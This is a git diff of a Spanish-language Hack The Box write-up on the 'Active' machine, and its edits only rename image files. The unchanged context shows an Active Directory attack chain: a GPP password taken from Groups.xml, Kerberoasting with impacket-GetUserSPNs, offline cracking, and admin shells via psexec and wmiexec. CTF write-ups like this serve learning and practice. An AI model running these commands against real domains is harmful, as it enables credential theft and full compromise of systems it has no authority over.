@@ -29,7 +29,7 @@ description: >-
   platform="HTB"
 %}
 
-![Active](/assets/img/htb-writeups/Pasted image 20240226101504.png)
+![Active](/assets/img/htb-writeups/Pasted-image-20240226101504.png)
 
 Active es una máquina de dificultad fácil a media, que presenta dos técnicas muy frecuentes para obtener privilegios dentro de un entorno de Active Directory.
 
@@ -103,11 +103,11 @@ smb: \> mget *
 
 Una vez descargado todo procedemos a inspeccionar los archivos uno a uno para ver si encontramos algo de valor.
 
-![Groups.xml location](/assets/img/htb-writeups/Pasted image 20240226113859.png)
+![Groups.xml location](/assets/img/htb-writeups/Pasted-image-20240226113859.png)
 
 Editamos `Groups.xml` indicado arriba y vemos que contiene un nombre usuario y una contraseña cifrada.
 
-![Groups.xml content](/assets/img/htb-writeups/Pasted image 20240226114918.png)
+![Groups.xml content](/assets/img/htb-writeups/Pasted-image-20240226114918.png)
 
 ```
 user=SVC_TGS
@@ -148,7 +148,7 @@ Ahora tenemos acceso de lectura a más recursos compartidos. Vamos a comprobar s
 $ impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18'
 ```
 
-![GetUserSPNs](/assets/img/htb-writeups/Pasted image 20240226123120.png)
+![GetUserSPNs](/assets/img/htb-writeups/Pasted-image-20240226123120.png)
 
 Y vemos que es el usuario Administrador! Vamos a solicitar el HASH para un TGS:
 
@@ -156,7 +156,7 @@ Y vemos que es el usuario Administrador! Vamos a solicitar el HASH para un TGS:
 $ impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request
 ```
 
-![TGS Hash](/assets/img/htb-writeups/Pasted image 20240226123233.png)
+![TGS Hash](/assets/img/htb-writeups/Pasted-image-20240226123233.png)
 
 Éxito! Copiamos el hash en un archivo y procedemos a desencriptar la contraseña con `john`:
 
@@ -194,7 +194,7 @@ $ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.210.170
 $ impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.129.210.170
 ```
 
-![Admin shell](/assets/img/htb-writeups/Pasted image 20240226124206.png)
+![Admin shell](/assets/img/htb-writeups/Pasted-image-20240226124206.png)
 
 Máquina comprometida!
 
